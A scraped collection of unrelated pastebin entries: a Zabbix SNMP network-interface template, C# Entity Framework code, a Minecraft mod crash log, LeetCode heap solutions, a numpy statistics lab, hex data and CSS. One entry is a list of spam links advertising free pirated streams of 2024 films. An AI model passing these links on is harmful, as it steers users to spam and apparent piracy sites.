                                ""description"": ""The desired state of the interface. The testing(3) state indicates that no operational packets can be passed. When a managed system initializes, all interfaces start with ifAdminStatus in the down(2) state. As a result of either explicit management action or per configuration information retained by the managed system, ifAdminStatus is then changed to either the up(1) or testing(3) states (or remains in the down(2) state).\n\n\u0416\u0435\u043b\u0430\u0435\u043c\u043e\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0430: \u0447\u0438\u0441\u043b\u043e\u0432\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435. 1 - up, 2 - down, 3 - testing, 5 - dormant, 6 - notPresent."",
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            },
                            {
                                ""uuid"": ""55555c92bef04331abfbc2c6dc5e0ae0"",
                                ""name"": ""IP address ({#NETWORKIFACENAME})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""IP-MIB::ipAdEntAddr[\""index\"",\""IP-MIB::ipAdEntIfIndex\"",{#SNMPINDEX}]"",
                                ""key"": ""network_interfaces_ipaddress[{#NETWORKIFACENAME}]"",
                                ""trends"": ""0"",
                                ""value_type"": ""TEXT"",
                                ""description"": ""Current interface IP address.\n\nIP \u0430\u0434\u0440\u0435\u0441 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0430. \u0420\u0430\u0431\u043e\u0442\u0430\u0435\u0442 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e \u0432 \u0441\u043b\u0443\u0447\u0430\u0435, \u0435\u0441\u043b\u0438 \u043d\u0430 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0435 \u0431\u043e\u043b\u0435\u0435 \u043e\u0434\u043d\u043e\u0433\u043e \u0430\u0434\u0440\u0435\u0441\u0430."",
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            },
                            {
                                ""uuid"": ""6a67defe132140a097fbc5b588f2fcd4"",
                                ""name"": ""Link state ({#NETWORKIFACENAME})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""IF-MIB::ifOperStatus.{#SNMPINDEX}"",
                                ""key"": ""network_interfaces_linkstate[{#NETWORKIFACENAME}]"",
                                ""delay"": ""20s"",
                                ""description"": ""The current operational state of the interface. The testing(3) state indicates that no operational packets can be passed. If ifAdminStatus is down(2) then ifOperStatus should be down(2). If ifAdminStatus is changed to up(1) then ifOperStatus should change to up(1) if the interface is ready to transmit and receive network traffic; it should change to dormant(5) if the interface is waiting for external actions (such as a serial line waiting for an incoming connection); it should remain in the down(2) state if and only if there is a fault that prevents it from going to the up(1) state; it should remain in the notPresent(6) state if the interface has missing (typically, hardware) components.\n\n\u0422\u0435\u043a\u0443\u0449\u0438\u0439 \u0441\u0442\u0430\u0442\u0443\u0441 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0430: \u0447\u0438\u0441\u043b\u043e\u0432\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435. 1 - up, 2 - down, 3 - testing, 5 - dormant, 6 - notPresent."",
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            },
                            {
                                ""uuid"": ""6677a4f0380048679249b2b69b623ff6"",
                                ""name"": ""MAC address ({#NETWORKIFACENAME})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""IF-MIB::ifPhysAddress.{#SNMPINDEX}"",
                                ""key"": ""network_interfaces_mac[{#NETWORKIFACENAME}]"",
                                ""delay"": ""60s"",
                                ""trends"": ""0"",
                                ""value_type"": ""TEXT"",
                                ""description"": ""The interface's address at its protocol sub-layer. For example, for an 802.x interface, this object normally contains a MAC address. The interface's media-specific MIB must define the bit and byte ordering and the format of the value of this object. For interfaces which do not have such an address (e.g., a serial line), this object should contain an octet string of zero length.\n\nMAC \u0430\u0434\u0440\u0435\u0441 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0430."",
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            },
                            {
                                ""uuid"": ""7817b41dca6240bdbcaf0e418254cdaa"",
                                ""name"": ""MTU ({#NETWORKIFACENAME})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""IF-MIB::ifMtu.{#SNMPINDEX}"",
                                ""key"": ""network_interfaces_mtu[{#NETWORKIFACENAME}]"",
                                ""delay"": ""60s"",
                                ""description"": ""The size of the largest packet which can be sent/received on the interface, pecified in octets. For interfaces that are used for transmitting network datagrams, this is the size of the largest network datagram that can be sent on the interface.\n\n\u0417\u043d\u0430\u0447\u0435\u043d\u0438\u0435 MTU \u043d\u0430 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0435."",
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            },
                            {
                                ""uuid"": ""f928d9843ebc4090b2f6a9f4a6a86801"",
                                ""name"": ""Download packets ({#NETWORKIFACENAME})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""IF-MIB::ifHCInUcastPkts.{#SNMPINDEX}"",
                                ""key"": ""network_interfaces_pktsdown[{#NETWORKIFACENAME}]"",
                                ""delay"": ""20s"",
                                ""value_type"": ""FLOAT"",
                                ""units"": ""pps"",
                                ""description"": ""The number of packets, delivered by this sub-layer to a higher (sub-)layer, which were not addressed to a multicast or broadcast address at this sub-layer.\nThis object is a 64-bit version of ifInUcastPkts.\nSpeed is calculated as an average change per second. See Preprocessing tab.\n\n\u0421\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u0432\u0445\u043e\u0434\u044f\u0449\u0435\u0433\u043e \u0442\u0440\u0430\u0444\u0438\u043a\u0430 \u043d\u0430 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0435 \u0432 \u043f\u0430\u043a\u0435\u0442\u0430\u0445 \u0432 \u0441\u0435\u043a\u0443\u043d\u0434\u0443."",
                                ""preprocessing"": [
                                    {
                                        ""type"": ""CHANGE_PER_SECOND"",
                                        ""parameters"": [
                                            """"
                                        ]
                                    }
                                ],
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            },
                            {
                                ""uuid"": ""9b1bfa76c0e04d5da4e063b994f4e4f0"",
                                ""name"": ""Upload packets ({#NETWORKIFACENAME})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""IF-MIB::ifHCOutUcastPkts.{#SNMPINDEX}"",
                                ""key"": ""network_interfaces_pktsup[{#NETWORKIFACENAME}]"",
                                ""delay"": ""20s"",
                                ""value_type"": ""FLOAT"",
                                ""units"": ""pps"",
                                ""description"": ""The total number of packets that higher-level protocols requested be transmitted, and which were not addressed to a multicast or broadcast address at this sub-layer, including those that were discarded or not sent.\nThis object is a 64-bit version of ifOutUcastPkts.\nSpeed is calculated as an average change per second. See Preprocessing tab.\n\n\u0421\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u0438\u0441\u0445\u043e\u0434\u044f\u0449\u0435\u0433\u043e \u0442\u0440\u0430\u0444\u0438\u043a\u0430 \u043d\u0430 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0435 \u0432 \u043f\u0430\u043a\u0435\u0442\u0430\u0445 \u0432 \u0441\u0435\u043a\u0443\u043d\u0434\u0443."",
                                ""preprocessing"": [
                                    {
                                        ""type"": ""CHANGE_PER_SECOND"",
                                        ""parameters"": [
                                            """"
                                        ]
                                    }
                                ],
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            },
                            {
                                ""uuid"": ""b5d111a5380545759fa445e8a7746ff1"",
                                ""name"": ""Download speed ({#NETWORKIFACENAME})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""IF-MIB::ifHCInOctets.{#SNMPINDEX}"",
                                ""key"": ""network_interfaces_speeddown[{#NETWORKIFACENAME}]"",
                                ""delay"": ""20s"",
                                ""value_type"": ""FLOAT"",
                                ""units"": ""bps"",
                                ""description"": ""The total number of octets received on the interface, including framing characters.\nThis object is a 64-bit version of ifInOctets.\nSpeed is calculated as an average change per second. See Preprocessing tab.\nConverted to bits per second.\n\n\u0421\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u0432\u0445\u043e\u0434\u044f\u0449\u0435\u0433\u043e \u0442\u0440\u0430\u0444\u0438\u043a\u0430 \u043d\u0430 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0435 \u0432 \u0431\u0438\u0442\u0430\u0445 \u0432 \u0441\u0435\u043a\u0443\u043d\u0434\u0443."",
                                ""preprocessing"": [
                                    {
                                        ""type"": ""CHANGE_PER_SECOND"",
                                        ""parameters"": [
                                            """"
                                        ]
                                    },
                                    {
                                        ""type"": ""MULTIPLIER"",
                                        ""parameters"": [
                                            ""8""
                                        ]
                                    }
                                ],
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            },
                            {
                                ""uuid"": ""fc37a1582eef43a28cb8575fa6be2dd7"",
                                ""name"": ""Upload speed ({#NETWORKIFACENAME})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""IF-MIB::ifHCOutOctets.{#SNMPINDEX}"",
                                ""key"": ""network_interfaces_speedup[{#NETWORKIFACENAME}]"",
                                ""delay"": ""20s"",
                                ""value_type"": ""FLOAT"",
                                ""units"": ""bps"",
                                ""description"": ""The total number of octets transmitted out of the interface, including framing characters.\nThis object is a 64-bit version of ifOutOctets.\nSpeed is calculated as an average change per second. See Preprocessing tab.\nConverted to bits per second.\n\n\u0421\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u0438\u0441\u0445\u043e\u0434\u044f\u0449\u0435\u0433\u043e \u0442\u0440\u0430\u0444\u0438\u043a\u0430 \u043d\u0430 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0435 \u0432 \u0431\u0438\u0442\u0430\u0445 \u0432 \u0441\u0435\u043a\u0443\u043d\u0434\u0443."",
                                ""preprocessing"": [
                                    {
                                        ""type"": ""CHANGE_PER_SECOND"",
                                        ""parameters"": [
                                            """"
                                        ]
                                    },
                                    {
                                        ""type"": ""MULTIPLIER"",
                                        ""parameters"": [
                                            ""8""
                                        ]
                                    }
                                ],
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""System Monitoring""
                                    }
                                ]
                            }
                        ]
                    },
                    {
                        ""uuid"": ""a0103cc0c6f041b381dde4263d930135"",
                        ""name"": ""VRRP Instance Discovery"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""discovery[{#VRRPINSTANCEIFACE},KEEPALIVED-MIB::vrrpInstanceName]"",
                        ""key"": ""vrrp_instances"",
                        ""delay"": ""30s"",
                        ""lifetime"": ""0"",
                        ""item_prototypes"": [
                            {
                                ""uuid"": ""aa56db7ef7414eb49542fbc0fb114af3"",
                                ""name"": ""VRRP node status ({#VRRPINSTANCEIFACE})"",
                                ""type"": ""SNMP_AGENT"",
                                ""snmp_oid"": ""KEEPALIVED-MIB::vrrpInstanceState.{#SNMPINDEX}"",
                                ""key"": ""vrrpInstanceState[{#VRRPINSTANCEIFACE}]"",
                                ""delay"": ""30s"",
                                ""description"": ""Represents a VRRP state.\n0 - INIT\n1 - BACKUP\n2 - MASTER\n3 - FAULT\n4 - UNKNOWN\n5 - SHUTDOWN\n\n\u0421\u0442\u0430\u0442\u0443\u0441 VRRP Instance: \u0447\u0438\u0441\u043b\u043e\u0432\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435. 1 - backup, 2 - master, 3 - fault, 4 - unknown."",
                                ""tags"": [
                                    {
                                        ""tag"": ""Application"",
                                        ""value"": ""VRRP""
                                    }
                                ]
                            }
                        ]
                    }
                ],
                ""valuemaps"": [
                    {
                        ""uuid"": ""5a168ce565e94774b1e3d4ace2c97c46"",
                        ""name"": ""IF-MIB::ifOperStatus"",
                        ""mappings"": [
                            {
                                ""value"": ""1"",
                                ""newvalue"": ""up""
                            },
                            {
                                ""value"": ""2"",
                                ""newvalue"": ""down""
                            },
                            {
                                ""value"": ""4"",
                                ""newvalue"": ""unknown""
                            },
                            {
                                ""value"": ""5"",
                                ""newvalue"": ""dormant""
                            },
                            {
                                ""value"": ""6"",
                                ""newvalue"": ""notPresent""
                            },
                            {
                                ""value"": ""7"",
                                ""newvalue"": ""lowerLayerDown""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""c3bf3b1da1f84c7783e37a9e6b73f980"",
                        ""name"": ""KEEPALIVED-MIB::vrrpInstanceState"",
                        ""mappings"": [
                            {
                                ""value"": ""0"",
                                ""newvalue"": ""Init""
                            },
                            {
                                ""value"": ""1"",
                                ""newvalue"": ""Backup""
                            },
                            {
                                ""value"": ""2"",
                                ""newvalue"": ""Master""
                            },
                            {
                                ""value"": ""3"",
                                ""newvalue"": ""Fault""
                            },
                            {
                                ""value"": ""4"",
                                ""newvalue"": ""Unknown""
                            },
                            {
                                ""value"": ""5"",
                                ""newvalue"": ""Shutdown""
                            }
                        ]
                    }
                ]
            }
        ]
    }
}"
fDkRf8SG,Untitled,Samuil_Krumov,C#,Monday 19th of February 2024 01:01:17 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Data.Entity;

namespace ConsoleAppDZI
{
    public class User
    {
        public int UserId { get; set; }
        public string Name { get; set; }
        public string Email { get; set; }
        public int Age { get; set; }
    }

    public class DataBaseContext : DbContext // Добавяне на клас, който наследява DbContext
    {
        public DbSet<User> Users { get; set; } // Добавяне на свойство за DbSet
    }

    class Program
    {
        static void Main(string[] args)
        {
            using (var db = new DataBaseContext())
            {
                // Запис на нов потребител
                var user = new User();
                Console.WriteLine(""Enter user details:"");
                Console.Write(""Name: "");
                user.Name = Console.ReadLine();
                Console.Write(""Email: "");
                user.Email = Console.ReadLine();
                Console.Write(""Age: "");
                user.Age = int.Parse(Console.ReadLine());
                db.Users.Add(user);
                db.SaveChanges(); // Запис на промените в базата данни
            }

            using (var db = new DataBaseContext())
            {
                // Извличане на потребителите над 18 години, подредени по години
                var users = (from u in db.Users
                             where u.Age > 18
                             orderby u.Age
                             select u);
                Console.WriteLine(""\nUsers over 18 years old:"");
                foreach (var user in users)
                {
                    Console.WriteLine(""{0} - {1} ({2} years old)"", user.UserId, user.Name, user.Age);
                }
            }
        }
    }
}
"
cs394RUw,Sticker Bom,shakarmdhn,C++,Monday 19th of February 2024 12:24:54 AM CDT,"FFFFFDC002E7003C001E0000FFFFFFFF000D
<
    000200290027019E019E005A6B6B6BFF0001
    139BFE9DFE8700520052FFD3FFFFFFFF0001
    05E3FEA4FE97005E005E002DFFFFFFFF0001
    05EDFE97FF68004700470000FFFFFFFF0001
    05EEFF42FF05004A004AFFD3FFFFFFFF0001
    05E9FF78FEF7008E008E005AFFFFFFFF0001
    0643010B0115006400640000FFFFFFFF0001
    06630107FE71006400640000FFFFFFFF0001
    09ECFEF80105006400640000FFFFFFFF0001
    09F3FEA50012006400640000FFFFFFFF0001
    09DA00270014006400640000FFFFFFFF0001
    0628004AFEFB006400640000FFFFFFFF0001
    06460086FF6D006400640000FFFFFFFF0001
    067E0111FEC0006400640000FFFFFFFF0001
    0610FFC60090006400640000FFFFFFFF0001
    0DC601D5FF91006400640000FFFFFFFF0001
    138EFFCA010E006400640000FFFFFFFF0001
    061EFFC201AA006400640000FFFFFFFF0001
    0650FEFD016400640064FFD3FFFFFFFF0001
    13C10104FFF4006400640000FFFFFFFF0001
    0634FF14FFB6006400640000FFFFFFFF0001
    06530066FEC700640064FFE7FFFFFFFF0001
    139E0112010D005300530000000000FF0001
    13B001160194007700770000FFFFFFFF0001
    0805FF1C01D1002900290000FFFFFFFF0001
    13DD01BAFEBC005700570000FFFFFFFF0001
    07D1FF63FE58003C003C0000FFFFFFFF0001
    07D6FEB2FFC7006400640000FFFFFFFF0001
    07DC0008FF21005500550000FFFFFFFF0001
    07E1FFF40029005E005E0000FFFFFFFF0001
    07E600F700D0005300530000FFFFFFFF0001
    07E700B5018A00470047FFF1FFFFFFFF0001
    07EDFEEE016B006400640000FFFFFFFF0001
    060BFECAFE64006400640000FFFFFFFF0001
    06060193FE98006400640000FFFFFFFF0001
    0608FECCFF21006400640000FFFFFFFF0001
    06090170FF2B006400640000FFFFFFFF0001
    13BAFF9300C6006400640000FFFFFFFF0001
    07D7FF390000006400640000FFFFFFFF0001
    07DD01A6000700640064005AFFFFFFFF0001
    08080095000700640064005AFFFFFFFF0001
    07E40000000000640064005AFFFFFFFF0001
    07FDFF37010500640064005AFFFFFFFF0001
    07EFFF3E015A006400640000FFFFFFFF0001
    07F5FF6400DC00640064005AFFFFFFFF0001
    05ED0174018400640064005AFFFFFFFF0001
    064800B4017B00640064005AFFFFFFFF0001
    064CFE80018C00640064005AFFFFFFFF0001
    063B001E018C00640064005AFFFFFFFF0001
    0642019EFEEB00640064005AFFFFFFFF0001
    05DFFEF4FEC200640064002DFFFFFFFF0001
    05E3FEEEFF7C00640064002DFFFFFFFF0001
    05EAFFFEFEBE00640064005AFFFFFFFF0001
    065800AAFEB500640064002DFFFFFFFF0001
    066800E801AF006400640000FFFFFFFF0001
    13B000F3FF8600640064005AFFFFFFFF0001
    13DA0066005800640064005AFFFFFFFF0001
    13DB00F9FFEF00640064005AFFFFFFFF0001
    1396FEC0008C00640064002DFFFFFFFF0001
    064FFF5E018100640064002DFFFFFFFF0001
    000200290027019E019E005A000000AE0001
>
"
ixYg2dhn,Untitled,dima_dencep,Java,Monday 19th of February 2024 12:23:36 AM CDT,"net.minecraftforge.fml.loading.EarlyLoadingException: Could not execute entrypoint stage 'main' due to errors, provided by 'ae2cc'!
	at dev.su5ed.sinytra.connector.loader.ConnectorEarlyLoader.createLoadingException(ConnectorEarlyLoader.java:81) ~[Connector-1.0.0-beta.36+1.20.1.jar%23289!/:1.0.0-beta.36+1.20.1] {}
	at dev.su5ed.sinytra.connector.loader.ConnectorEarlyLoader.createGenericLoadingException(ConnectorEarlyLoader.java:77) ~[Connector-1.0.0-beta.36+1.20.1.jar%23289!/:1.0.0-beta.36+1.20.1] {}
	at dev.su5ed.sinytra.connector.mod.ConnectorLoader.load(ConnectorLoader.java:55) ~[Connector-1.0.0-beta.36+1.20.1-mod.jar%23293!/:1.0.0-beta.36+1.20.1] {re:mixin,re:classloading}
	at net.minecraft.client.Minecraft.handler$zib000$connectormod$earlyInit(Minecraft.java:6423) ~[client-1.20.1-20230612.114412-srg.jar%23426!/:?] {re:mixin,pl:accesstransformer:B,pl:connector_pre_launch:A,pl:runtimedistcleaner:A,re:classloading,pl:accesstransformer:B,pl:mixin:A,pl:connector_pre_launch:A,pl:runtimedistcleaner:A}
	at net.minecraft.client.Minecraft.<init>(Minecraft.java:424) ~[client-1.20.1-20230612.114412-srg.jar%23426!/:?] {re:mixin,pl:accesstransformer:B,pl:connector_pre_launch:A,pl:runtimedistcleaner:A,re:classloading,pl:accesstransformer:B,pl:mixin:A,pl:connector_pre_launch:A,pl:runtimedistcleaner:A}
	at net.minecraft.client.main.Main.main(Main.java:182) ~[1.20.1-forge-47.1.3.jar:?] {re:mixin,pl:connector_pre_launch:A,pl:runtimedistcleaner:A,re:classloading,pl:mixin:A,pl:connector_pre_launch:A,pl:runtimedistcleaner:A}
	at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:?] {}
	at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77) ~[?:?] {}
	at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:?] {}
	at java.lang.reflect.Method.invoke(Method.java:568) ~[?:?] {}
	at net.minecraftforge.fml.loading.targets.CommonLaunchHandler.runTarget(CommonLaunchHandler.java:126) ~[loader-47.2.2.jar:47.2] {}
	at net.minecraftforge.fml.loading.targets.CommonLaunchHandler.clientService(CommonLaunchHandler.java:114) ~[loader-47.2.2.jar:47.2] {}
	at net.minecraftforge.fml.loading.targets.CommonClientLaunchHandler.runService(CommonClientLaunchHandler.java:24) ~[loader-47.2.2.jar:47.2] {}
	at net.minecraftforge.fml.loading.targets.CommonLaunchHandler.lambda$launchService$4(CommonLaunchHandler.java:108) ~[loader-47.2.2.jar:47.2] {}
	at cpw.mods.modlauncher.LaunchServiceHandlerDecorator.launch(LaunchServiceHandlerDecorator.java:30) ~[modlauncher-10.0.9.jar:?] {}
	at cpw.mods.modlauncher.LaunchServiceHandler.launch(LaunchServiceHandler.java:53) ~[modlauncher-10.0.9.jar:?] {}
	at cpw.mods.modlauncher.LaunchServiceHandler.launch(LaunchServiceHandler.java:71) ~[modlauncher-10.0.9.jar:?] {}
	at cpw.mods.modlauncher.Launcher.run(Launcher.java:108) ~[modlauncher-10.0.9.jar:?] {}
	at cpw.mods.modlauncher.Launcher.main(Launcher.java:78) ~[modlauncher-10.0.9.jar:?] {}
	at cpw.mods.modlauncher.BootstrapLaunchConsumer.accept(BootstrapLaunchConsumer.java:26) ~[modlauncher-10.0.9.jar:?] {}
	at cpw.mods.modlauncher.BootstrapLaunchConsumer.accept(BootstrapLaunchConsumer.java:23) ~[modlauncher-10.0.9.jar:?] {}
	at cpw.mods.bootstraplauncher.BootstrapLauncher.main(BootstrapLauncher.java:141) ~[bootstraplauncher-1.1.2.jar:?] {}
Caused by: java.lang.RuntimeException: Could not execute entrypoint stage 'main' due to errors, provided by 'ae2cc'!
	at net.fabricmc.loader.impl.FabricLoaderImpl.lambda$invokeEntrypoints$0(FabricLoaderImpl.java:131) ~[Connector-1.0.0-beta.36+1.20.1.jar%23289!/:1.0.0-beta.36+1.20.1] {}
	at net.fabricmc.loader.impl.util.ExceptionUtil.gatherExceptions(ExceptionUtil.java:33) ~[Connector-1.0.0-beta.36+1.20.1.jar%23289!/:1.0.0-beta.36+1.20.1] {}
	at net.fabricmc.loader.impl.FabricLoaderImpl.invokeEntrypoints(FabricLoaderImpl.java:129) ~[Connector-1.0.0-beta.36+1.20.1.jar%23289!/:1.0.0-beta.36+1.20.1] {}
	at dev.su5ed.sinytra.connector.mod.ConnectorLoader.load(ConnectorLoader.java:44) ~[Connector-1.0.0-beta.36+1.20.1-mod.jar%23293!/:1.0.0-beta.36+1.20.1] {re:mixin,re:classloading}
	... 19 more
Caused by: java.lang.NoClassDefFoundError: dan200/computercraft/api/peripheral/PeripheralLookup
	at io.github.themrmilchmann.ae2cc.AE2CCBridge.onInitialize(AE2CCBridge.java:59) ~[PowerAE2CCBridge-1.1.0.0-1.20.1-FABRIC_mapped_srg_1.20.1.jar%23867!/:?] {re:classloading}
	at net.fabricmc.loader.impl.FabricLoaderImpl.invokeEntrypoints(FabricLoaderImpl.java:127) ~[Connector-1.0.0-beta.36+1.20.1.jar%23289!/:1.0.0-beta.36+1.20.1] {}
	at dev.su5ed.sinytra.connector.mod.ConnectorLoader.load(ConnectorLoader.java:44) ~[Connector-1.0.0-beta.36+1.20.1-mod.jar%23293!/:1.0.0-beta.36+1.20.1] {re:mixin,re:classloading}
	... 19 more
Caused by: java.lang.ClassNotFoundException: dan200.computercraft.api.peripheral.PeripheralLookup
	at cpw.mods.cl.ModuleClassLoader.loadClass(ModuleClassLoader.java:141) ~[securejarhandler-2.1.10.jar:?] {}
	at java.lang.ClassLoader.loadClass(ClassLoader.java:525) ~[?:?] {}
	at io.github.themrmilchmann.ae2cc.AE2CCBridge.onInitialize(AE2CCBridge.java:59) ~[PowerAE2CCBridge-1.1.0.0-1.20.1-FABRIC_mapped_srg_1.20.1.jar%23867!/:?] {re:classloading}
	at net.fabricmc.loader.impl.FabricLoaderImpl.invokeEntrypoints(FabricLoaderImpl.java:127) ~[Connector-1.0.0-beta.36+1.20.1.jar%23289!/:1.0.0-beta.36+1.20.1] {}
	at dev.su5ed.sinytra.connector.mod.ConnectorLoader.load(ConnectorLoader.java:44) ~[Connector-1.0.0-beta.36+1.20.1-mod.jar%23293!/:1.0.0-beta.36+1.20.1] {re:mixin,re:classloading}
	... 19 more"
7QnnVQZ9,Untitled,smj007,Python,Sunday 18th of February 2024 11:00:56 PM CDT,"class Solution:
    def findKthLargest(self, nums: List[int], k: int) -> int:

        minheap = []

        for num in nums:
            heapq.heappush(minheap, num)

            if len(minheap) > k:
                heapq.heappop(minheap)

        return minheap[0]
        "
PLtHLqGy,numpy lab(19/02/2024),brandblox,Python,Sunday 18th of February 2024 10:23:45 PM CDT,"# using logic
import math

def get_input():
    size = int(input(""Enter length of array: ""))
    num_data = []
    for i in range(size):
        number = int(input(""Enter element {}: "".format(i+1)))
        num_data.append(number)
    return num_data

def mean(data):
    return sum(data) / len(data)

def variance(data):
    mu = mean(data)
    return sum((x - mu) ** 2 for x in data) / len(data)

def std_deviation(data):
    return math.sqrt(variance(data))

data = get_input()
print(""Mean:"", mean(data))
print(""Variance:"", variance(data))
print(""Standard Deviation:"", std_deviation(data))

#using library
import numpy as np

def get_input():
    size = int(input(""Enter length of array: ""))
    num_data = []
    for i in range(size):
        number = int(input(""Enter element {}: "".format(i+1)))
        num_data.append(number)
    return num_data

def mean(data):
    return np.mean(data)

def variance(data):
    return np.var(data)

def std_deviation(data):
    return np.std(data)

data = get_input()
print(""Mean:"", mean(data))
print(""Variance:"", variance(data))
print(""Standard Deviation:"", std_deviation(data))

#Output
Enter length of array: 12
Enter element 1: 103
Enter element 2: 85
Enter element 3: 117
Enter element 4: 98
Enter element 5: 203
Enter element 6: 119
Enter element 7: 48
Enter element 8: 65
Enter element 9: 86
Enter element 10: 110
Enter element 11: 180
Enter element 12: 156
Mean: 114.16666666666667
Variance: 1904.138888888889
Standard Deviation: 43.63643991996699"
bMjGQjSP,Untitled,smj007,Python,Sunday 18th of February 2024 10:15:53 PM CDT,"class Solution:
    def findKthLargest(self, nums: List[int], k: int) -> int:

        heapq.heapify(nums)

        while (len(nums)) > k:
            heapq.heappop(nums)

        return nums[0]"
Sgg0aHjE,Untitled,smj007,Python,Sunday 18th of February 2024 09:57:41 PM CDT,"class Solution:
    def kClosest(self, points: List[List[int]], k: int) -> List[List[int]]:

        dist = [[math.sqrt(x**2 + y**2), x, y] for (x, y) in points]
        heapq.heapify(dist)
        res = []

        for i in range(k):
            d, x, y = heapq.heappop(dist)
            res.append([x, y])

        return res
        
""""""
Time Complexity : O(N + klogN), constructing the heap from given array of points P can be done in O(N) time. Then each heap pop operation would take O(logN) time which will be called for k times. Thus overall time will be O(N + klogN)
Space Complexity : O(1), we are doing it in-place. If input modification is not allowed, use a copy of P and that would take O(N) space""""""
"
99RNFFZq,Untitled,smj007,Python,Sunday 18th of February 2024 09:46:59 PM CDT,"class Solution:
    def kClosest(self, points: List[List[int]], k: int) -> List[List[int]]:

        dist = [[math.sqrt(x**2 + y**2), x, y] for (x, y) in points]
        heapq.heapify(dist)
        res = []

        for i in range(k):
            d, x, y = heapq.heappop(dist)
            res.append([x, y])

        return res
        "
R6DtfXJS,fghftyutfd,gadungw71,PHP,Sunday 18th of February 2024 09:42:32 PM CDT,"https://www.taskade.com/p/xem-phim-nang-tho-cua-miller-2024-thuyet-minh-full-hd-viet-01HPTR075263Z9EM9NDXXN9C39
https://www.taskade.com/p/full-hd-nang-tho-cua-miller-2024-xem-phim-vietsub-thuyet-minh-01HPVTNHF2FJMABFY79MCKRN0B
https://www.taskade.com/p/full-hd-madame-web-2024-xem-phim-vietsub-thuyet-minh-01HPVW7P6NN15S2WS024CNQVYV
https://www.taskade.com/p/xem-phim-madame-web-2024-1080-full-vietsub-01HPVX5N0FZQRCZT81A8SXXJ9J
https://yuoptk2707.expandcart.com/index.php?route=product/product&product_id=373
https://jbttlm7579.expandcart.com/index.php?route=product/product&product_id=373
https://oxaizd0388.expandcart.com/index.php?route=product/product&product_id=373
https://ftdcfq0045.expandcart.com/index.php?route=product/product&product_id=373
https://m.facebook.com/media/set/?set=a.722910123319769
https://m.facebook.com/media/set/?set=a.722911433319638
https://forum.webnovel.com/d/164012-xem-phim-mai-2024-vietsub-thuyet-minh-full-hd1080p
https://forum.webnovel.com/d/164013-xem-phim-mai-2024-full-hd-thuyet-minh-truc-tuyen-mien-phi-vietsub
https://tbohxq6895.expandcart.com/index.php?route=product/product&product_id=373
https://baskadia.com/post/3x15y
https://demo.hedgedoc.org/s/aoTGg_g-v
https://paiza.io/projects/yTJsJnpE_RjyP2FjCVFhSQ
https://pastelink.net/flgxob8e
https://rentry.co/prccwpet
https://glot.io/snippets/gtjon36lsx
https://paste.ec/paste/YAgI9sI3#Tp3OX38NOc8xpGR7oYclNO0IjJX0+o12BaREpGuKd4E"
CqudauSN,Pro for My Little Pokket,althindor,CSS,Sunday 18th of February 2024 09:28:11 PM CDT,"/* Design by Cassiel Socks */
/* And Coding by AlthIndor */

:root {
	--aqua: #7AFFD2;
	--purp: #CBAAEE;
	--pink: #FF5858;
}

html, body {
	background: url('https://i.imgur.com/2zzIjye.png') center #E4C0F4;
	min-height:	800px;
}
body {position: relative;}

body a {
	text-decoration: none !important;
	transition: all .5s ease-in-out;
}

::selection {
	background: var(--pink);
	color: #FFFFFF;
}

/* Sprite Sheet Management */

#columns, #id_comments h2 + div, #columns::after {background: url('https://i.imgur.com/h2wQ0yZ.png');}
